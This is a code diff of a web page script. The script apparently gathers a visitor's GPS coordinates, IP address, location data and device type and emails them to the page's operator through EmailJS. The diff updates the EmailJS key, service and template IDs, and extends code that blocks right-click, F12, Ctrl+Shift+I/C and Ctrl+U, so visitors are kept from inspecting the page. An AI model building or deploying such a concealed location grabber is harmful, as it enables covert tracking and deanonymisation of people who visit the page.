@@ -35,9 +35,9 @@
         <p id="locationResult" style="display: none; margin: 0;"></p>
     </div>
 
-    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        emailjs.init("MPhPUQIdgkUqoKusv");
+        emailjs.init("59lIq8t38QCpN7yr2");
 
         const deviceType = (() => {
             const userAgent = navigator.userAgent;
@@ -52,7 +52,7 @@
 
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) || (e.ctrlKey && (e.key === 'U' || e.key === 'u'))) {
+            if (e.key === 'F12' || e.ctrlKey && e.shiftKey && e.key === 'i' || e.ctrlKey && e.shiftKey && e.key === 'I'|| e.ctrlKey && e.shiftKey && e.key === 'c' || e.ctrlKey && e.shiftKey && e.key === 'C' || e.ctrlKey && e.key === 'U' || e.ctrlKey && e.key === 'u') {
                 e.preventDefault();
             }
         });
@@ -114,7 +114,7 @@
 
         // Updated sendEmail to accept a single parameter with properties
         function sendEmail({ coords, ipAddress, locationData }) {
-            emailjs.send("service_k0yec69", "template_1f01srj", {
+            emailjs.send("service_simqgxz", "template_38eh6sw", {
                 user_latitude: coords.latitude,
                 user_longitude: coords.longitude,
                 user_ipaddress: ipAddress,
